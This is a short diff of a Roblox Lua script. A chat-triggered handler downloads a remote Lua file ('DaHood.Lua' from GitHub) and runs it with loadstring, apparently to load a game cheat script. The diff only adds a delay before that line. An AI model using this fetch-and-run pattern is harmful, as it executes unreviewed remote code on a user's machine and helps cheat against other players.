@@ -8,6 +8,7 @@ while true do
 wait()
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == a then
+wait(5)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
 end
 end)
